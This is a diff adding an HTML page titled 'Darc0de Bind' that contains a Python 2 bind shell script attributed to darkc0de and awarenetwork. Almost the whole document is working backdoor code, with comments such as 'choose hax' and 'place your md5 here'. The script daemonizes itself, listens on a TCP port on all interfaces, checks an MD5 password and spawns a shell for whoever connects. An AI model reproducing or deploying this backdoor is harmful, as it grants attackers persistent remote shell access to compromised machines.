@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Darc0de Bind</title>
+</head><body>#https://github.com/rewardone/darkc0de-old-stuff/blob/master/bindshell.py<br/>
+# Seems OS agnostic and has simple authentication<br/>
+# python bindshell, fancy version<br/>
+# (C) 2005 http://www.awarenetwork.org<br/>
+# choose hax<br/>
+<br/>
+import md5,os,sys,select<br/>
+from pty import spawn, fork<br/>
+from socket import *<br/>
+<br/>
+hexa &nbsp;= "1f88c9132134bf3fda24ab36b82b2d2d" #place your md5 here (d3hydr8)<br/>
+watch = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)<br/>
+port &nbsp;= sys.argv[-1].isdigit() and int(sys.argv[-1]) or 2100<br/>
+die &nbsp; = False<br/>
+<br/>
+if os.fork(): sys.exit(0)<br/>
+<br/>
+try:<br/>
+&nbsp; &nbsp; watch.bind(("0",port))<br/>
+&nbsp; &nbsp; watch.listen(5)<br/>
+except:<br/>
+&nbsp; &nbsp; print "[%d] unable to create socket" % os.getpid()<br/>
+else:<br/>
+&nbsp; &nbsp; print "[%d] bindshell on port %d" % (os.getpid(),port)<br/>
+<br/>
+while True:<br/>
+&nbsp; &nbsp; sock, remote = watch.accept()<br/>
+&nbsp; &nbsp; if os.fork(): continue<br/>
+&nbsp; &nbsp; pid, childID = fork()<br/>
+<br/>
+&nbsp; &nbsp; if pid == 0:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if md5.md5(raw_input("pw: ")).hexdigest().upper() == hexa.upper():<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spawn( raw_input("sh: "))<br/>
+&nbsp; &nbsp; else:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; c = os.fdopen(childID,'r+'); &nbsp;data = "";<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; x = {b:c,c:b}<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; while True:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for f in select.select([b,c],[],[])[0]:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try: d = os.read(f.fileno(),4096)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; except: sys.exit(0)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if f is c and d.strip()==data:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data= ""; continue<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x[f].write(d)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x[f].flush()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = d.strip()<br/>
+<br/>
+&nbsp; &nbsp; sock.close()<br/>
+</body></html>
